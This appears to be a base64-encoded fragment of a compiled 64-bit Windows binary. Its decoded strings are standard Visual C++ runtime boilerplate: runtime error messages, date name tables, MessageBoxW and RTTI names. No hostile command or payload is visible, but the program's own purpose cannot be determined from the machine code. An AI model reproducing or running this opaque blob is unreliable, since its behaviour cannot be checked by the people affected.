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GkAbgAuAA0ACgAAAAAAUgA2ADAAMwAyAA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAGMAYQBsAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAAAAAAFIANgAwADMAMQANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIABpAG4AaQB0AGkAYQBsAGkAegBlACAAdABoAGUAIABDAFIAVAAgAG0AbwByAGUAIAB0AGgAYQBuACAAbwBuAGMAZQAuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuAA0ACgAAAAAAUgA2ADAAMwAwAA0ACgAtACAAQwBSAFQAIABuAG8AdAAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAZAANAAoAAAAAAAAAAAAAAAAAUgA2ADAAMgA4AA0ACgAtACAAdQBuAGEAYgBsAGUAIAB0AG8AIABpAG4AaQB0AGkAYQBsAGkAegBlACAAaABlAGEAcAANAAoAAAAAAAAAAABSADYAMAAyADcADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABsAG8AdwBpAG8AIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAUgA2ADAAMgA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAcwB0AGQAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIANQANAAoALQAgAHAAdQByAGUAIAB2AGkAcgB0AHUAYQBsACAAZgB1AG4AYwB0AGkAbwBuACAAYwBhAGwAbAANAAoAAAAAAAAAUgA2ADAAMgA0AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAXwBvAG4AZQB4AGkAdAAvAGEAdABlAHgAaQB0ACAAdABhAGIAbABlAA0ACgAAAAAAAAAAAFIANgAwA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iBhdCAoAAAAAAAgVHlwZSBEZXNjcmlwdG9yJwAAAAAAAABgbG9jYWwgc3RhdGljIHRocmVhZCBndWFyZCcAAAAAAGBtYW5hZ2VkIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAGB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAAAAAGB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAABgZHluYW1pYyBhdGV4aXQgZGVzdHJ1Y3RvciBmb3IgJwAAAAAAAAAAYGR5bmFtaWMgaW5pdGlhbGl6ZXIgZm9yICcAAAAAAABgZWggdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAABgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYG1hbmFnZWQgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBwbGFjZW1lbnQgZGVsZXRlIGNsb3N1cmUnAAAAAAAAYG9tbmkgY2FsbHNpZycAACBkZWxldGVbXQAAACBuZXdbXQAAAAAAAGBsb2NhbCB2ZnRhYmxlIGNvbnN0cnVjdG9yIGNsb3N1cmUnAAAAAABgbG9jYWwgdmZ0YWJsZScAYFJUVEkAAABgRUgAAAAAAGB1ZHQgcmV0dXJuaW5nJwBgY29weSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAAAAAGBlaCB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAABgZWggdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAGBlaCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAAABgdmlydHVhbCBkaXNwbGFjZW1lbnQgbWFwJwAAAAAAAGB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAABgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYHNjYWxhciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgZGVmYXVsdCBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAGB2ZWN0b3IgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYHZiYXNlIGRlc3RydWN0b